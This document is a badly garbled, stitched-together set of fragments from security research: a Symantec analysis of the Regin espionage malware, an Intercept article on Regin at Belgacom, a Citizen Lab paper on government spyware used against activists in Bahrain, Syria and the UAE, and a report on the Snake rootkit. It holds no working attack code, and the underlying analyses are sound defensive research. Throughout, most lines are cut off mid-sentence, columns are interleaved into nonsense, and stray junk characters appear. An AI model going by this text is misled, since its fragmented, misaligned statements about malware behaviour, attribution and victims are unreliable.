Regin is a multi - staged , modular threat , meaning that it has a number of components ,
Regin is different to what are commonly referred to as “ traditional ” advanced persistent
This report provides a technical analysis of Regin based on a number of identified
Regin has a wide
Regin : Top - tier espionage tool enables stealthy surveillance
Introduction
Regin is a multi - purpose data collection tool which dates back several years . Symantec first began looking into
Regin has a wide range of standard capabilities , particularly around monitoring targets and stealing data . It also
Regin is capable of installing a large number of additional payloads , some highly customized for the targeted
Regin goes to some lengths to hide the data it is stealing . Valuable target data is often not written to disk . In
Timeline
Symantec is aware of two distinct versions of Regin . Version 1.0 appears to have been used from at least 2008 to
Version 1.0 appears to have been abruptly withdrawn from circulation in 2011 . Version 1.0 samples found after
This report is based primarily on our analysis of Regin version 1.0 . We also touch on version 2.0 , for which we
Symantec has assigned these version identifiers as they are the only two versions that have been acquired . Regin
Page 5
Regin : Top - tier espionage tool enables stealthy surveillance
Target profile
The Regin operators do not appear to
Regin infections have been observed
Infections are also geographically
Infection vector
The infection vector varies among
Regin originated from Yahoo ! Instant
Messenger through an unconfirmed
Figure 1 . Confirmed Regin infections by sector
Figure 2 . Confirmed Regin infections by country
Page 6
The initial Stage 1
All other stages are
Regin : Top - tier espionage tool enables stealthy surveillance
Architecture
Regin has a six - stage architecture . The initial         Table 1 . The six stages of Regin
Stage 1          Loads driver
Stage 4          Utilizes the EVFS and loads additional kernel mode
Figure 3 . Regin ’s architecture
Page 8
Regin : Top - tier espionage tool enables stealthy surveillance
Stage 0 ( dropper )
Symantec Security Response has not obtained the Regin dropper at the time of writing . Symantec believes that
Stage 1
Stage 1 is the initial load point for the threat . There are two known Stage 1 file names :
These are kernel drivers that load and execute Stage 2 . These kernel drivers may be registered as a system
Stage 1 simply reads and executes Stage 2 from a set of NTFS extended attributes . If no extended attributes are
Stage 2
Stage 2 is a kernel driver that simply extracts , installs and runs Stage 3 . Stage 2 is not stored in the traditional
Stage 2 can be found encrypted in :
Extended attribute
Registry subkey
This stage can also hide running instances of Stage 1 . Once this happens , there are no remaining plainly visible
Stage 2 can also monitor the state of the threat . This stage drops the file msrdc64.dat , which appears to always
Stage 3
Stage 3 is a kernel mode DLL and is not stored in the traditional file system . Instead , this file is encrypted within
Page 9
Regin : Top - tier espionage tool enables stealthy surveillance
Stage 3 can be found in the following locations :
Extended attribute
Registry subkey
The file is six to seven times the size of the driver in Stage 2 . In addition to loading and executing Stage 4 , Stage
Stages 3 and above are based on a modular framework of code modules . These modules offer functions through
In the case of Stage 3 , the following primitives are offered :
These primitives are provided through a custom export methodology .
Export methodology
The Stage 3 DLL exports a wide range         Table 2 . An example of Regin ’s methods organized into 12 groups
Exported Regin methods are referenced
With Regin ’s modular nature , Stage
Page 10
Regin : Top - tier espionage tool enables stealthy surveillance
Stage 4
The files for Stage 4 , which are loaded by Stage 3 , consist of a user - mode orchestrator and multiple kernel
Regin ’s payload .
When the attackers who operated Regin cleaned up compromised computers once they were finished with them ,
Stage 4 also uses the same export methodology described in Stage 3 .
Stage 5
Stage 5 consists of the main Regin payload functionality . The files for Stage 5 are injected into services.exe by
Stage 4 .
Stage 5 files are EVFS containers containing other files :
Regin ’s payload involves the DLLs contained in the SystemLog.evt EVFS container .
The payload functionality differs depending on the targeted computer . Custom
Encrypted virtual file system containers
Regin stores data files and payloads on disk in encrypted virtual file system files . Such
Known extensions for EVFS containers are * .evt and * .imd . The structure of a
Page 11
Regin : Top - tier espionage tool enables stealthy surveillance
A container starts with the header in Table 3
Offset                 Type        Description
The header is followed by the file entry table
The sectors follow ( Table 5 ) . A sector of                04h                    WORD        Maximum file count
As explained above , the files are encrypted .             0Fh                    WORD        Number of files
Other layers of encryption and compression               11h                    WORD        Number of sectors in use
Command - and - control                                       Table 4 . The container ’s file entry table
Regin ’s C&C operations are extensive . These
The C&C operations are undertaken by various modules , including major groups C373h , 19h , 9 , as well as Stage
Logging
Regin logs data to the ApplicationLog.dat file . This file is not an encrypted container , but it is encrypted and
Page 12
The extensible
Regin : Top - tier espionage tool enables stealthy surveillance
Payloads
Regin can be distributed with various payload modules or receive payload modules after infection . The
Table 6 . Regin ’s stage 4 kernel payload modules and stage 5 user mode payload modules
File type Major        Description
Used to set TCP and UDP pass - through filters and to bypass firewalls .
Executes BPF ( Berkeley Packet Filter ) bytecode , stored in Stage 5 data files .
Page 14
Regin : Top - tier espionage tool enables stealthy surveillance
Enumeration through COM objects to find IIS logs . Ability to retrieve partial or complete log information .
The IIS web server log stealing module , 27E9h , is an example of a payload module that was installed after the initial
Only a small amount of the 64-bit Regin files have been recovered . These samples may represent version 2.0 or
File names
The recovered files do not appear to fundamentally vary from their 32-bit counterparts , apart from a few noteworthy
The 32-bit and 64-bit versions of Regin use different file names . These differences are shown in the first section of
Stage differences
The 64-bit version of Regin ’s Stage 1 ( wshnetc.dll ) is no longer a kernel mode driver , as drivers under 64-bit Windows
Page 15
Regin : Top - tier espionage tool enables stealthy surveillance
The 64-bit Regin ’s Stage 3 has not been recovered . We believe that it may not exist , as the 32-bit version is a driver .
Stage 4 is an orchestrator just like its 32-bit counterpart and it uses the same major and minor values to export
Stage 5 uses the following filenames :
No Stage 5 payload modules have been recovered .
Conclusion
Regin is a highly - complex threat which has been used for large - scale data collection or intelligence gathering
The discovery of Regin serves to highlight how significant investments continue to be made into the development
Protection
Symantec and Norton products detect this threat as Backdoor . Regin .
Page 16
Regin : Top - tier espionage tool enables stealthy surveillance
Appendix
Data files
Regin ’s data files are classified as Stage 5 components and are contained in an EVFS container .
Table 7 . Data files used by Stage 4 ’s framework DLL
Major       Minor       Description
Typically , % System\config\ApplicationLog . Evt
C373        01          BPF bytecode for the netpcap driver — allows UDP passthrough
Page 18
Regin : Top - tier espionage tool enables stealthy surveillance
As the data files are stored in a container , they do       Table 8 . Data files used by Stage 5 ’s modules ( payloads )
Not all data files have been recovered , so the              C375          01           Dword ( 1 )
Data files associated with Stage 4 kernel modules
C383          01           Dword ( 1 )
Table 8 lists recovered data files used by Stage 5
The associated modules that supposedly
C399          -
C39F          00           Small file , 18h bytes , low entropy
C3A1          01           Small file , 6 bytes ( 08 01 00 00 00 01 )
C3C1          -            -
C3B5          -            -
C36B          -            -
C351          -            -
C38F          -           -
C3C5          -           -
Table 9 . Orphaned data files
Major Minor Description
Page 19
Regin : Top - tier espionage tool enables stealthy surveillance
Indicators of compromise
The following details can be used to help determine whether you have been impacted by this threat .
File MD5s
File names / paths
Page 20
Regin : Top - tier espionage tool enables stealthy surveillance
Extended attributes
Registry
Page 21
About Symantec
Symantec Corporation ( NASDAQ : SYMC ) is an information
Ninety - nine percent of Fortune 500 companies are Symantec
To learn more go to www.symantec.com or connect with
Symantec at : go.symantec.com / social/.
For specific country offices and contact numbers , please visit our website .
Symantec World Headquarters                                                                                   Copyright © 2014 Symantec Corporation . All
Mountain View , CA 94043 USA                                                                                   registered trademarks of Symantec Corporation
Any technical information that is made available by Symantec Corporation is the copyrighted work of Symantec Corporation and is owned by Symantec
Corporation .
Complex malware known as Regin is the suspected technology behind sophisticated cyberattacks conducted by U.S. and British intelligence agencies on the
European Union and a Belgian telecommunications company , according to security industry sources and technical analysis conducted by The Intercept .
Regin was found on infected internal computer systems and email servers at Belgacom , a partly state - owned Belgian phone and internet provider , following
Headquarters , industry sources told The Intercept .
The malware , which steals data from infected systems and disguises itself as legitimate Microsoft software , has also been identified on the same European Union
The hacking operations against Belgacom and the European Union were first revealed last year through documents leaked by NSA whistleblower Edward
Snowden . The specific malware used in the attacks has never been disclosed , however .
The Regin malware , whose existence was first reported by the security firm Symantec on Sunday , is among the most sophisticated ever discovered by researchers .
Symantec compared Regin to Stuxnet , a state - sponsored malware program developed by the U.S. and Israel to sabotage computers at an Iranian nuclear facility .
Sources familiar with internal investigations at Belgacom and the European Union have confirmed to The Intercept that the Regin malware was found on their
Ronald Prins , a security expert whose company Fox IT was hired to remove the malware from Belgacom ’s networks , told The Intercept that it was “ the most
A spokesman for Belgacom declined to comment specifically about the Regin revelations , but said that the company had shared “ every element about the attack ”
In a hacking mission codenamed Operation Socialist , GCHQ gained access to Belgacom ’s internal systems in 2010 by targeting engineers at the company . The
The implants allowed GCHQ to conduct surveillance of internal Belgacom company communications and gave British spies the ability to gather data from the
One of the keys to Regin is its stealth : To avoid detection and frustrate analysis , malware used in such operations frequently adhere to a modular design . This
Based on an analysis of the malware samples , Regin appears to have been developed over the course of more than a decade ; The Intercept has identified traces of
Arabia , Mexico , Ireland , Belgium , and Iran .
The use of hacking techniques and malware in state - sponsored espionage has been publicly documented over the last few years : China has been linked to extensive
Western intelligence agencies are also involved in covert cyberespionage .
The NSA said in a statement , “ We are not going to comment on The Intercept ’s speculation . ”
The Intercept has obtained samples of the malware from sources in the security community and is making it available for public download in an effort to
What follows is a brief technical analysis of Regin conducted by The Intercept ’s computer security staff . Regin is an extremely complex , multi - faceted piece of
In the coming weeks , The Intercept will publish more details about Regin and the infiltration of Belgacom as part of an investigation in partnership with Belgian
Origin of Regin
In Nordic mythology , the name Regin is associated with a violent dwarf who is corrupted by greed . It is unclear how the Regin malware first got its name , but the
Der Spiegel reported that , according to Snowden documents , the computer networks of the European Union were infiltrated by the NSA in the months before the
Industry sources familiar with the European Parliament intrusion told The Intercept that such attacks were conducted through the use of Regin and provided
Also on March 9th 2011 , Microsoft added related entries to its Malware Encyclopedia :
Alert level : Severe
First detected by definition : 1.99.894.0
Latest detected by definition : 1.173.2181.0 and higher
First detected on : Mar 09 , 2011
This entry was first published on : Mar 09 , 2011
This entry was updated on : Not available
Two more variants of Regin have been added to the Encyclopedia , Regin . B and Regin . C. Microsoft appears to detect the 64-bit variants of Regin as Prax . A and
Prax . B. None of the Regin / Prax entries are provided with any sort of summary or technical information .
The following Regin components have been identified :
Loaders
The first stage are drivers which act as loaders for a second stage . They have an encrypted block which points to the location of the 2nd stage payload . On NTFS ,
The Regin loaders that are disguised as Microsoft drivers with names such as :
Mimicking Microsoft drivers allows the loaders to better disguise their presence on the system and appear less suspicious to host intrusion detection systems .
Second stage loader
When launched , it cleans traces of the initial loader , loads the next part of the toolkit and monitors its execution . On failure , Stage 2 is able to disinfect the
Orchestrator
This component consists of a service orchestrator working in Windows’ kernel . It initializes the core components of the architecture and loads the next parts of the
Information Harvesters
This stage is composed of a service orchestrator located in user land , provided with many modules which are loaded dynamically as needed . These modules can
Stealth Implant
The Intercept ’s investigation revealed a sample uploaded on VirusTotal on March 14th 2012 that presents the unique 0xfedcbafe header , which is a sign that it
This picture shows the very first bytes of the sample in question , showing the unique 0xfedcbafe header at the beginning .
In order to access information stored in the computer ’s memory , programs use objects that reference specific locations in memory called pointers . This binary file
The sample has the following SHA256 hash :
This sample gives a sense of the sophistication of the actors and the length of the precautions they have been taking in order to operate as stealthily as possible .
When a Windows kernel driver needs to allocate memory to store some type of data , it creates so called kernel pools . Such memory allocations have specific
When performing forensic analysis of a computer ’s memory , it is common to use a technique called pool scanning to parse the kernel memory , enumerate such
Just like Regin loader drivers , this driver repeatedly uses the generic “ Ddk “ tag with ExAllocatePoolWithTag ( ) when allocating all kernel pools :
This picture shows the use of the “ ddk “ tag when allocating memory with the Windows ExAllocatePoolWIthTag ( ) function .
The generic tag which is used throughout the operating system when a proper tag is not specified . This makes it more difficult for forensic analysts to find any
In addition , when freeing memory using ExFreePool ( ) , the driver zeroes the content , probably to avoid leaving traces in pool memory .
The driver also contains routines to check for specific builds of the Windows kernel in use , including very old versions such as for Windows NT4 Terminal Server
Windows kernel drivers operate on different levels of priority , from the lowest PASSIVE_LEVEL to the highest HIGH_LEVEL . This level is used by the processor
This Regin driver recurrently checks that the current IRQL ( Interrupt Request Level ) is set to PASSIVE_LEVEL using the KeGetCurrentIrql ( ) function in many
Upon execution of the unload routine ( located at 0xFDEFA04A ) , the driver performs a long sequence of steps to remove remaining traces and artifacts .
Belgacom Sample
In an interview given to the Belgian magazine MondiaalNiews , Fabrice Clément , head of security of Belgacom , said that the company first identified the attack on
June 21 , 2013 .
In the same interview Clément says that the computers targeted by the attackers included staff workstations as well as email servers .
These statements confirm the timing and techniques used in the attack .
From previously identified Regin samples , The Intercept developed unique signatures which could identify this toolkit . A zip archive with a sample identified as
Regin / Prax was found in VirusTotal , a free , online website which allows people to submit files to be scanned by several anti - virus products . The zip archive was
The archive contains :
Along with other files The Intercept found the output of a forensic tool , GetThis , which is being run on target systems looking for malware . From the content of the
The malware in question is “ 0001000000000C1C_svcsstat.exe_sample ” . This is a 64bit variant of the first stage Regin loader aforementioned .
The archive also contains the output of ProcMon , “ Process Monitor ” , a system monitoring tool distributed by Microsoft and commonly used in forensics and
This file identifies the infected system and provides a variety of interesting information about the network . For instance :
The following environment variable shows that the system was provided with a Microsoft SQL server and a Microsoft Exchange server , indicating that it might one
Path = C:\Program
Files\Microsoft Network Monitor 3\;C:\Program Files\System Center Operations Manager 2007\;c:\Program Files ( x86)\Microsoft SQL
Below is a list of hashes for the files The Intercept is making available for download . Given that that it has been over a year since the Belgacom operation was
Regin Samples
Photo credit : Winfried Rothermel / AP
When Governments Hack Opponents :
A Look at Actors and Technology
William R. Marczak , University of California , Berkeley , and The Citizen Lab ;
John Scott - Railton , University of California , Los Angeles , and The Citizen Lab ;
Morgan Marquis - Boire , The Citizen Lab ; Vern Paxson , University of California , Berkeley ,
This paper is included in the Proceedings of the
August 20–22 , 2014 • San Diego , CA
Open access to the Proceedings of
When Governments Hack Opponents : A Look at Actors and Technology
William R. Marczak                          John Scott - Railton                   Morgan Marquis - Boire
Vern Paxson
Abstract                                                              we provide extensive detail from both technical and operational
Repressive nation - states have long monitored telecommunica-           izations as the fundamental first step necessary for the rigorous ,
United Arab Emirates , investigating attackers , tools , and tech-       ing anecdote , pieced together from public reports and court
Gamma ’s FinSpy and Hacking Team ’s Remote Control Sys-                 him into custody . He was charged with referring to Bahrain ’s
Twitter handle , and contained a link to a protest video , purport-
Computer security research devotes extensive efforts to pro-
Ali ’s case is an example of the larger phenomenon we in-
In this work we undertake to characterize the emergent prob-       services , like iplogger.org . On the other hand , some at-
We obtained the majority of our artifacts by encouraging in-            2     Related Work
Our analysis links these attacks with a common class of ac-             surveillance and activities like law - enforcement interception is
We make the following contributions :                                    Twitter [ 17 ] , and Facebook [ 18 ] increasingly make transport-
Finally , we do not explore potential defenses appropriate for           Tibetan independence movement [ 24 , 25 ] . Other work avoids
Country    Date Range           Range of Targets                                Number and Type of Samples                               Distinct Malware C&C ’s
Bahrain    4/9/12—              ≥ 12 activists , dissidents , trade unionists ,    8 FinSpy samples , 7 IP spy links received via private    4 distinct IP addresses
Syria      2011 to present      10–20 individuals with technical back-          40–50 : predominantly BlackShades , DarkComet ,             160 distinct IP addresses
Table 1 : Range of data for the study .
Country    Possible Impacts                   Probable Impacts
Bahrain    1 . 3 individuals arrested , sen-    1 . Activist serving 1 yr in
Syria      1 . Sensitive opposition com-       1 . Opposition members dis-
Table 2 : Negative outcomes plausibly or quite likely aris-
We have analyzed two attack campaigns in the context of
Our study is based on extensive analysis of malicious files and                       Bahrain , where the government has been pursuing a crackdown
We began our work when contacted by individuals con-                               links were later arrested , including Ali ( cf . § 1 ) , whose click
This following sections outline recent targeted hacking cam-                          appear as an image .          Their filenames contained a Uni-
Identification as FinSpy : By running the sample using                   ated with another government [ 4 ] . However , a proxy would
Windows Virtual PC , we found the following string in mem-                  show gaps in a global IPID as it forwarded traffic ; our frequent
This string suggests FinSpy , a product of Gamma Inter-                     statement .
This executable contained a similar string , except it identi-              inside Bahrain . Bahrain Watch established a fake login page
Analysis of capabilities : We found that the spyware has                 VM with FinSpy and allowed it to connect to the Bahrain C&C
Skype chat , file transfers , and input from the computer ’s micro-           infected the VM . Decrypting packet captures of the spyware ’s
To exfiltrate data back to the C&C server , a module encrypts            exactly one minute earlier :
Analysis of encryption : Because the malware employed
We found that FinSpy encrypts data using a custom imple-                hit from the same IP address within a minute . We inspected
The weak AES keys make decryption of the data straightfor-                 IP spy Campaign . In an IP spy attack , the attacker aims to
In addition , FinSpy ’s AES code fails to encrypt the last block          an e - mail containing an embedded remote image , using one of
C&C server :             The samples communicated with                    connects back to accounts that sent links shortened using a par-
Batelco , Bahrain ’s main ISP . Analyzing network traffic                     service .
In response to our preliminary work an executive at Gamma                  3 Several webmail providers and e - mail clients take limited steps to
Twitter ID
Jehad Abdulla                                                                                           Twitter ID
Salman Darwish
Arrested
Account begins
Red Sky
Twitter ID
Al Kawarah News Clicked
Ali Al - Shufa
Arrested
M         Clicked
House raid
Yokogawa Union                              Sami Abdulaziz Yokogawa
Legend
Actor    Spyware      C&C     Domain name      Packer     Target    Infection Targeted         Exploit       E - Mail      Consequence Attacker Bait Document
Figure 2 : The ecosystem of Bahrain “ IP spy ” attacks .
Red Sky was purportedly arrested on 10/17/12 , was convicted
The attack on Jehad Abdulla is noteworthy , as the ac-
Bahrain ’s opposition . However , the account also directly crit-
The message that Red Sky ’s account sent to Al Kawarah
News included a link shortened using Google ’s goo.gl ser-
Ali ’s case files contained a request from the Public Prose-                                      Another account linked to al9mood targeted @YLUBH , the
Kawarah News about 22 hours after the link was created . Court                                    Bahraini branch of a Japanese company . @YLUBH received at
Red Sky also targeted M in Figure 2 . M recalled click-                                        dulaziz Hassan , on 3/23/13 [ 30 ] . It later emerged that Sami was
Use of embedded remote images : We identified several
While ReadNotify.com forbids spoofing in their TOS ,                       sic functionality , including screen capture , keylogging , remote
When spoofing using this method , the original sender ad-                  ( 3 ) a link that will trigger a drive - by download . The messages
In monitoring accounts connected to al9mood , we counted                   C&C , 216.6.0.28 , a Syrian IP address belonging to the Syr-
Facebook posts . Attackers often used ( 1 ) accounts of promi-                  as a C&C of Syrian malware since February 2012 [ 45 ] . The
Twitter ’s default font , for example substituting a lowercase “ l ”             play to the victim as “ .rcs.pdf . ” The second bait file is
The use of RATs against the opposition has been a well-                          For seeding , the attackers typically use compromised ac-
As summarized in Table 3 , the attacks often include fake or ma-              Bn .      In the cases of Opp . Member C and NGO Worker
Researchers and security professionals have already profiled                  Interestingly , in the case of the fake Skype encryption
Anecdotally , campaign volume appears to track significant
Type                      Features                                                                      Examples ( RATs )
Security tools            Executable files presented as a “ tool ” often accompanied by justifica-        “ Skype Encryption ” ( DC ) [ 32 , 33 ] , “ Facebook Security ” ( cus-
Ideologically    or        A document or PE as download or attachment with accompanying en-              “ Names of individuals wanted by the Regime , ” ( DC ) “ Aleppo
Frequent use of RLO to disguise true extension ( such as .exe or               database frontend ( custom ) , movement relevant video ( njRAT ) ,
Miscellaneous tools       Tools pretending to offer functionality relevant to the opposition , such      hack facebook pro v6.9 ( DC ) [ 40 ]
Table 3 : Campaigns and RATs employed in Syrian surveillance . BS = Blackshades , DC = DarkComet , ST = Shad-
Actors                             .sytes.net
Dark Comet
E - Mail                 E - Mail
Victim A                   Credentials
Arrested
Figure 3 : A sample from the ecosystem of Syrian malware campaigns .
Real world consequences . The logistics and activities of
Syria ’s numerous opposition groups are intentionally concealed
The Syrian conflict is ongoing , making it difficult to assem-
Exploit Kit
The policeman told me , “ Do you remember when
Laptop
Beyond the ongoing challenges of attribution , these malware           tacks .
Sheikh Tahnoon bin Zayed Al - Nayhan , a member of the UAE
While the UAE has experienced no recent uprising or politi-                  Identification as RCS : We identified strings in memory
The first attacks we observed in the UAE involved a                    pany Hacking Team [ 54 ] . We also located a structurally sim-
The attachment exploited CVE-2010 - 3333 , an RTF pars-                   obfuscated to look like the PuTTY SSH client .
The exploit loaded shellcode that downloaded a second stage               sector to modify the boot process ; the spyware is loaded be-
The RCS samples we examined also had the ability to propa-
Hosts sample that           Same IP             SameIP1
H.R. activist B     njq8
Journalist F
Exploitation of captured data : When Ahmed Mansoor re-
Two weeks after this correspondence with Ahmed , one of us
The instance of Xtreme RAT sent to Author used                        Figure 6 : Another part of the ecosystem of UAE surveil-
Possible consequences : Shortly after he was targeted ,                 downloaded a second stage , which in turn downloaded a sam-
Ahmed says he was physically assaulted twice by an attacker              ple of SpyNet from maile-s.com . This sample of SpyNet
He believes these consequences are part of a government in-              the RunPE method [ 62 ] , an executable packed with UPX [ 63 ] .
Further attacks : In October 2012 , UAE Journalist A and                the Visual Basic project bears the name NoWayTech , which
Human Rights activist B ( per Figure 6 ) forwarded us suspi-               appears to be an underground RunPE tool , while others are
We were unable to obtain the second stage or the ultimate pay-              Cedar Key attack : The same VB Packer was used in an
However , the exploit kit appears indicative of Hacking Team              E in Figure 6 . These individuals received e - mails containing a
The cedarkeyrv.com domain is associated with an RV                     ing results found by past scans . In many cases we do not release
The exploit used in the attack appears to have been origi-
C&C storge.myftp.org . This same C&C occurred in an-                       and the presence of signatures such as the bizarre “ Hallo
D ; in that case , the payload was a freely - available RAT known             servers [ 67 , 68 ] . See Appendix A for details . We then exhaus-
More SpyNet attacks : The domain hamas.sytes.net ,                       can obscure the location of the C&C server ( called the mas-
Appin : In early 2013 UAE H.R. activist E forwarded nu-                 servers We note some interesting master locations in Table 4 .
Two of the other CVE-2012 - 0158 exploits down-                          certed effort to vary the behavior of FinSpy servers to make
Ethiopia , Nigeria , Qatar , Turkmenistan , UAE , Vietnam .
Additional FinSpy samples : In parallel to our scanning ,
The samples we received afforded us an opportunity to em-                 This feature sends us all newly - submitted samples that match
Relay IP              Relay Block Assignment     Relay Country     Master IP                Master Block Assignment     Master Country
Table 4 : Deproxifying FinSpy ( mapping initial C&C IP addresses to the masters to which they forward ) .
Japan              10            Maroc Telecom           7
Morocco               7              InfoLink              6
We began by analyzing the UAE RCS sample from Ahmed and
Table 5 : Top countries and hosting providers for RCS
Fingerprints : We probed the C&C servers of the RCS and                 Team [ 76 ] . The domain hackingteam.it resolves to an
We searched sources including Shodan , 5 Internet Census
Nigeria , Oman , Saudi Arabia , Sudan , UAE , Uzbekistan .
Link to Hacking Team : All active servers match-
One SSL certificate returned by 175 of the servers was issued
The project ’s author is listed as Alberto Ornaghi , a software
Some servers returned these certificates in chains that in-
C&C server code may incorporate code from this project .
Links between servers : We identified many cases where
We devised two more indicators : one that matched 125 IP
Server locations : On 11/4/13 we probed all of the IP ad-                   8 19 of the 42 Linode servers were hosted in the USA , so the two
We identified several server groups that may be associated with             ernment hacking in Libya , speculated as to why some users
Turkey : We identified a group containing 20 servers in 9                 we were desperate to get our voices out . . . it was a matter of
Acknowledgment
We also found server groups containing servers in Uzbek-                    The authors would like to thank the following individuals
Total uploaded from these countries that communicated with                  man , Collin D. Anderson , Brandon Dixon , Zakir Durumeric ,
In the above cases , save Turkey , the country we have identi-             Shane Huntley , Andrew Lyons , Mark Schloesser , and Nicholas
Hacking Team products against the types of targets we profile
Targeted surveillance of individuals conducted by nation - states              [ 2 ] J. Scott - Railton , “ Revolutionary Risks : Cyber Technol-
Eastern countries . The attacks include spyware for ongoing                       2013 , accessed : 12-November-2013 . [ Online ] . Available :
The attacks , while sometimes incorporating effective so-                     Bahrain ; May Be Stolen Copy , ” Jul. 2012 , ac-
State - Sponsored Spying , ” 2013 , accessed : 12-November-                  cessed :       27-February-2014 . [ Online ] . Available :
Tracker for Internet Censorship , ” in ACM CCS , 2007 .                    http://bit.ly/1clcxSZ
Proc . PAM , 2011 .                                                       http://bit.ly/1aRUZ4b
Enforcement Wiretaps , ” in ACM CCS , 2009 , pp . 512–                 [ 32 ] N. Villeneuve , “ Fake Skype Encryption Service Cloaks
Jul. 2013 , accessed : 8-August-2013 . [ Online ] . Available :               2012 , accessed : 4-August-2013 . [ Online ] . Available :
August-2013 . [ Online ] . Available : http://bit.ly/1bBktPM           [ 36 ] J. Scott - Railton and M. Marquis - Boire , “ A Call to Harm :
Available : http://bit.ly/1bsLBCm                                       in Fake Revolutionary Documents Targets Syrian Ac-
Available : http://bit.ly/1cSJT0
Monitoring Solutions , ” accessed : 12-November-2013 .
Units , ” 2013 .
Warfare Monitor , p. 6 , 2009 .                                      [ 42 ] L. Aylward , “ Malware Analysis — Dark Comet RAT , ”
Tech . Rep. , 2009 .                                                 [ 43 ] Quequero , “ DarkComet Analysis — Understanding the
Available : http://bit.ly/1fzLA0m                                      http://upx.sourceforge.net/
Syrian conflict , ” Feb. 2012 , accessed : 4-August-2013 .                 line ] . Available : http://bit.ly/NA1O0A
Available : jalnosra.com                                               point.com/vb/t357796.html
Syrian Activists , ” Dec. 2012 , accessed : 4-August-2013 .                [ Online ] . Available : http://bit.ly/1eJjVMV
Available : http://atfp.co/17t8yq5                                     researchers , ” accessed : 27-February-2014 . [ Online ] .
Available : http://plusvic.github.io/yara/
Activists Pardoned and Freed , ”            2013 ,    ac-             [ 71 ] “ Cross - platform Trojan controls Windows and Mac
Available : http://www.royalgroupuae.com/                              ingTeam ’s Remote Control System , ” 2013 , accessed :
Machines , ” 2012 , accessed : 27-February-2014 . [ Online ] .           [ 73 ] “ Internet Census 2012 , ” 2013 , accessed : 7-August-2013 .
Available : http://bit.ly/MzheRJ                                       [ Online ] . Available : http://bit.ly/1i7rRHs
Fast Internet - Wide Scanning and its Security Applica-
Available : http://www.hackingteam.it/
Available : http://www.matcode.com/mpress.htm
Activist Through Microsoft Flaw , ” 2012 , ac-                           http - server
Hit by Uprisings , ” 2013 , accessed : 14-November-2013 .                  Available : http://bit.ly/HQ1oRc
Available : http://newspynetrat.blogspot.com/                          accessed :       14-November-2013 . [ Online ] . Available :
Available : http://www.aspack.com/asprotect32.html                [ 81 ] M. Marquis - Boire and B. Marczak , “ From Bahrain
A      FinSpy fingerprints
Previous work by Guarnieri on scanning for FinSpy servers
Bahraini FinSpy C&C server returns a response with the string
We refer to this fingerprint as α1 . Concurrent with this ef-
Spy C&C server , which follows a custom TLV - based protocol
We observed a trend : changes in HTTP response behavior
In July 2012 , for example , after a post about Bahraini FinSpy
Subsequent scans of /0 for α2 and α3 , and five service
Spy servers were updated to accept types of invalid data they
As of 3/13/13 , all servers that matched any α fingerprint
D
A
A3B- 7 - 01 - 04
A
\{B9 g.c 520
D 5
Resu
L
L
E
B8
A0
A0
A1
One of the questions which comes up in the months after big security whitepaper disclosures is :
Did they continue on as before , did they re - build the disclosed infrastructure and tools , did they go
In some cases , the disclosure had little , if any impact on the operation . For example , after the
In the September 2010 issue of Foreign Affairs magazine1 , former US Deputy Secretary of Defense
William J. Lynn discussed a cyber - attack which happened two years previously on the DoD ’s
The article included the now oft - quoted phrase ‘ digital beachhead’ to describe what was
However , the operation behind the attacks has continued with little modification to the tools and
There are some threats which come and go , whilst there are others which are permanent
When antivirus back - end classification platforms can not identify a malware family for an analysed malicious sample , they assign
Back in 2008 an unknown malicious file was discovered and auto - classified as “ Agent . BTZ ” , meaning it was registered as unknown
Meanwhile , internally the authors behind this malware were using their own naming systems - with specific titles for their file
A recent report from German security company GData3 described a sample from the “ uroburos ” variant of this framework . Their
Reverse engineering of recent malware samples shows these to be much more advanced variants of Agent . BTZ , though still sharing
Snake ’s architecture turned out to be quite interesting . We have identified two distinct variants , both highly flexible but with two
In the first model , the network communications are carried out from the userland - i.e. the area of the computer system where
In both architectures there is a kernel mode driver installed and a usermode DLL injected by the driver into the system processes .
In both architectures , there is both 32-bit and 64-bit code involved . In order to distinguish between these architectures , we will call
The remainder of this report gives a detailed explanation of how the two Snake architectures embed themselves in the target
In total we have collected over 100 unique files related to this espionage toolkit . Many of these were submitted to online malware
Source country 2010 2011 2012 2013 2014 Total
Ukraine              1    3      6     8    14                                    32
Lithuania                           9     2                                    11
Great Britain                       4                                          4
Belgium                             2                                          2
Georgia                                  2                                     2
United States            1      1                                               2
Romania                             1                                          1
Hungary                                  1                                     1
Italy                                    1                                     1
Total                1    4      7    24    20                                    56
Whilst this view is likely to only be the tip of the iceberg , it does give us an initial insight into the profile of targets for the Snake
Other useful visualisations of the operations come from the compile timestamps . Below is shown a table with a count of the
Year           01        02         03          04        05        06         07        08        09        10         11         12      Total
Total               8         15           9         4         9         13         6         2         1         11         10         12 100
Plotting the day of the week in which the samples were compiled shows a now familiar pattern for analysts of modern cyber - attacks .
The creators of the malware operate a working week , just like any other professional . The single sample in our set which was
Mon       Tue       We d        Thu         Fri             Sat             Sun
The usermode - centric architecture of Snake is known to have been used from 2011 till 2014 , with the most recent sample compiled
With this architecture , the Snake driver is mainly used to load the DLL module into the usermode processes , and then use that
One of the analysed samples exposed multiple debug messages and source control check - in logs . It is not clear why those
For example , the analysed driver gave away the following source file names :
The source control check - in log examples , showing the names of the developers to be ‘ vlad’ and ‘ gilg’ :
It also exposed the project name of this particular variant as ‘ sengoku’ :
Now it ’s time to execute the driver and see what it does .
When first executed , the driver creates device named \Device\vstor32 with a symbolic link \DosDevices\vstor32 .
This device is used for userland / kernel communications .
Next , it drops a DLL into the % windows% directory - the DLL is carried in the body of the driver as a binary chunk with
Depending on the variant , the DLL is dropped either under a random name or a hard - coded name , such as mscpx32n.dll .
The purpose of this DLL is to be injected into the user - mode processes . Some variants of Snake carry the DLL modules that can be
Next , the driver sets up the hooks for the following kernel - mode APIs :
After that , it calls PsSetCreateProcessNotifyRoutine ( ) in order to be notified whenever a new process is started .
The handlers of the hooks above along with the notification callback allow Snake to stay persistent on a system , being able to infect
Another set of hooks it sets is designed to hide the presence of the Snake components on the system :
The driver then watches for all userland processes to see if they load any web pages .
As long as the user is not using the Internet , Snake stays dormant too , as there is no process that communicates with the web
However , as soon as the user goes online , the driver intercepts that event and then immediately injects the malicious DLL module
Once injected , the module initiates polling from one of the hard - coded C&C servers .
The purpose of this behaviour is to blend Snake ’s traffic with the browser traffic , bypassing the firewalls , and keeping a low profile
The reason behind such difficulty is because modern web pages often fetch pages from the different web servers , including such
Hiding a few DNS / HTTP requests among busy network traffic allows Snake rootkit to stay unnoticed .
In order to test Snake ’s communications with the C&C servers , and still being able to clearly distinguish its traffic , a small tool was
The tool was named as chrome.exe in order to trigger the malware communications .
